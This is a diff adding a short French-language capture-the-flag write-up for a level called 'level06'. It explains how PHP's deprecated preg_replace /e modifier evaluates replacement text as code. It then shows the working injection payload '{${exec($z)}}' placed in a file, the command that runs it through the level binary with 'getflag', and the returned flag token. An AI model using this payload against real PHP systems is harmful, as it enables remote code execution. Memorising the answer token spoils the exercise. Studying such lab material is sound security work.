@@ -1,0 +1,34 @@
+deux fichiers dans le home:
+	- un fichier php
+	- le code php "compile"
+
+le deuxieme argument ne sert a rien a priori
+
+------------------------
+
+https://regex101.com/
+
+https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php
+
+\e:
+	This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.
+	If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes (\) and NULL chars will be escaped by backslashes in substituted backreferences. 
+
+-----
+
+Le \e permet d'executer du code. On va donc utiliser la fonction exec pour lancer une commande.
+
+Le script n'utilise pas le deuxieme argument on va donc s'en servir pour lancer la commande getflag
+
+fichier:
+
+[x .<h1>{${exec($z)}}</h1>]
+
+pour le lancer:
+
+./level06 /tmp/a "getflag"
+
+retour:
+
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+ x <h1></h1>
